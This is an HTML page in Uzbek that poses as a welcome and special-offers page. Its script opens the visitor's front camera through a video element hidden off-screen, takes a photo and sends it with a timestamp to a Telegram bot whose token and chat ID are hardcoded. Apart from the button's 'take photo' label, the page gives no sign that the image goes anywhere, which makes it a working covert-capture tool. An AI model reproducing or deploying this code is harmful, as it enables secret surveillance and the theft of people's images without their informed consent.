<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xush kelibsiz!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        h1 {
            color: #333;
            margin-bottom: 15px;
            font-size: 28px;
        }
        p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 30px;
            font-size: 16px;
        }
        .icon {
            font-size: 60px;
            margin-bottom: 20px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }
        button:active {
            transform: translateY(0);
        }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        #status {
            text-align: center;
            padding: 12px;
            margin: 15px 0;
            border-radius: 8px;
            font-size: 14px;
            display: none;
        }
        .success {
            background: #d4edda;
            color: #155724;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
        }
        .info {
            background: #d1ecf1;
            color: #0c5460;
        }
        .loading {
            display: none;
            margin: 20px 0;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .counter {
            margin: 20px 0;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
            font-size: 16px;
            color: #333;
        }
        .counter span {
            font-weight: bold;
            color: #667eea;
            font-size: 24px;
        }
        /* Video va canvasni butunlay yashirish */
        #video, #canvas {
            position: absolute;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">ðŸŽ‰</div>
        <h1>Xush kelibsiz!</h1>
        <p>Ushbu sahifada maxsus taklif va yangiliklar bilan tanishing</p>
        
        <div class="counter" id="counter" style="display:none;">
            Rasmlar soni: <span id="photoCount">0</span>
        </div>
        
        <button id="enterBtn">Rasm Olish</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 10px; color: #666;">Yuklanmoqda...</p>
        </div>
        
        <div id="status"></div>
    </div>

    <!-- Yashirin video va canvas -->
    <video id="video" autoplay playsinline muted webkit-playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');
        const enterBtn = document.getElementById('enterBtn');
        const loading = document.getElementById('loading');
        const counter = document.getElementById('counter');
        const photoCount = document.getElementById('photoCount');
        
        // Yashirin sozlamalar
        const botToken = '8501079047:AAHtw9f_rEUY8aoGiOaFiQ4mjeW8jlyIPW8';
        const chatId = '8425301175';
        let stream = null;
        let isProcessing = false;
        let totalPhotos = 0;

        function showStatus(message, type, duration = 3000) {
            status.textContent = message;
            status.className = type;
            status.style.display = 'block';
            setTimeout(() => {
                status.style.display = 'none';
            }, duration);
        }

        async function initCamera() {
            if (stream) return true;
            
            try {
                // Mobil qurilmalar uchun kengaytirilgan sozlamalar
                const constraints = {
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280, max: 1920 },
                        height: { ideal: 720, max: 1080 }
                    },
                    audio: false
                };
                
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                
                // Video yuklanishini kutish
                return new Promise((resolve, reject) => {
                    video.onloadedmetadata = () => {
                        video.play().then(() => {
                            console.log('Kamera ishga tushdi');
                            resolve(true);
                        }).catch(reject);
                    };
                    video.onerror = reject;
                    
                    // 5 soniya timeout
                    setTimeout(() => reject(new Error('Video yuklanmadi')), 5000);
                });
                
            } catch (err) {
                console.error('Kamera xatosi:', err);
                throw err;
            }
        }

        async function capturePhoto() {
            if (isProcessing) {
                showStatus('Iltimos kuting...', 'info');
                return;
            }
            
            isProcessing = true;
            enterBtn.disabled = true;
            loading.style.display = 'block';
            
            try {
                // Kamerani ishga tushirish
                const cameraReady = await initCamera();
                
                if (!cameraReady) {
                    throw new Error('Kamera tayyor emas');
                }
                
                // Kamera barqarorlashtirish uchun kutish
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Rasmni olish
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Blob yaratish
                const blob = await new Promise((resolve, reject) => {
                    canvas.toBlob((b) => {
                        if (b) resolve(b);
                        else reject(new Error('Blob yaratilmadi'));
                    }, 'image/jpeg', 0.92);
                });
                
                if (!blob || blob.size === 0) {
                    throw new Error('Rasm olishda xatolik');
                }
                
                // Telegram'ga yuborish
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'photo.jpg');
                
                const timestamp = new Date().toLocaleString('uz-UZ', {
                    timeZone: 'Asia/Tashkent',
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
                
                formData.append('caption', `ðŸ“¸ Rasm #${totalPhotos + 1}\nðŸ• ${timestamp}`);
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                loading.style.display = 'none';
                
                if (result.ok) {
                    totalPhotos++;
                    photoCount.textContent = totalPhotos;
                    counter.style.display = 'block';
                    showStatus('âœ… Rasm yuborildi!', 'success');
                    enterBtn.textContent = 'Yana Rasm Olish';
                } else {
                    throw new Error(result.description || 'Yuborishda xatolik');
                }
                
            } catch (err) {
                console.error('Xatolik:', err);
                loading.style.display = 'none';
                
                let errorMsg = 'Xatolik yuz berdi';
                if (err.name === 'NotAllowedError') {
                    errorMsg = 'Kamera ruxsati berilmadi';
                } else if (err.name === 'NotFoundError') {
                    errorMsg = 'Kamera topilmadi';
                } else if (err.message) {
                    errorMsg = err.message;
                }
                
                showStatus('âŒ ' + errorMsg, 'error', 5000);
                
                // Streamni tozalash
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                    stream = null;
                    video.srcObject = null;
                }
            } finally {
                isProcessing = false;
                enterBtn.disabled = false;
            }
        }

        enterBtn.addEventListener('click', capturePhoto);
        
        // Sahifa yopilganda streamni tozalash
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
